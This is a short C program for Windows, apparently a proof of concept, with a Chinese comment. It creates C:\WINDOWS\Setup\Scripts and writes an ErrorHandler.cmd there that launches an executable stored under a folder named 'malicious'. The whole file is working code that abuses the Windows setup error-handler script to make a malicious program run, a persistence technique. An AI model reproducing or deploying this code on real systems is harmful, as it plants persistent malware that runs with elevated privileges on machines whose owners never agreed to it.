#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  if (!CreateDirectory("C:\\WINDOWS\\Setup\\Scripts", NULL)) {
    DWORD error = GetLastError();
    if (error != ERROR_ALREADY_EXISTS) {
      printf("Failed to create directory. error: %lu\n", error);
      return -1;
    }
  }

  //创建ErrorHandler.cmd文件并写入
  HANDLE hFile = CreateFile("C:\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    printf("Failed to create ErrorHandler file. error: %lu\n", GetLastError());
    return -1;
  }
  const char* data = "@echo off\n\"C:\\Users\\Administrator\\Desktop\\test\\malicious\\pre\\wolf.exe\"";
  DWORD bytesWritten;
  if (!WriteFile(hFile, data, strlen(data), &bytesWritten, NULL)) {
    printf("Failed to write to ErrorHandler file. error: %lu\n", GetLastError());
  }
  CloseHandle(hFile);
  return 0;
}
